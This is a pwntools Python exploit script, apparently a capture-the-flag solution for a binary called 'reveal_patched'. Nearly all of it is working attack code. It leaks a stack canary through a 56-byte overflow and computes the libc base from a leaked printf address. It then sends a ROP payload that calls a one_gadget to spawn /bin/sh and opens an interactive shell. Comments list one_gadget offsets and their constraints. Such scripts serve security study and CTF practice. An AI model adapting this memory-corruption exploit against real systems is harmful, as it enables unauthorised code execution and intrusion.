from pwn import *
from warnings import filterwarnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)



# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *main+210
continue
'''.format(**locals())

exe = './reveal_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
filterwarnings("ignore")

# ===========================================================
#                    EXPLOIT GOES HERE
# # ===========================================================

# ➜  revealZ one_gadget libc.so.6 
# 0x50a47 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
#   rbp == NULL || (u16)[rbp] == NULL

# 0xebc81 execve("/bin/sh", r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebc85 execve("/bin/sh", r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebc88 execve("/bin/sh", rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
# ➜  revealZ 


io = start()
libc = elf.libc

padding = b"A"*56
io.sendafter(b": ", padding)
io.recvuntil(b"A"*56)
canary = u64(io.recv(8))
printf = 0x1337133713371337 ^ canary
libc.address = printf - libc.sym['printf']

info("Canary: %#x", canary)
info("Printf: %#x", printf)
info("Libc base: %#x", libc.address)

one_gadget = libc.address + 0x50a47
pop_rdi = libc.address + 0x000000000002a3e5 # pop rdi; ret; 
pop_rsi = libc.address + 0x000000000002be51 # pop rsi; ret; 
pop_rdx = libc.address + 0x000000000011f4d7 # pop rdx; pop r12; ret; 
pop_rbp = libc.address + 0x000000000002a2e0 # pop rbp; ret; 


sh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']

offset = 56

payload = flat({
    offset: [
        canary,
        b'A'*8,
        pop_rbp,
        0x0,
        one_gadget
    ]
})

io.sendline(payload)

io.interactive()
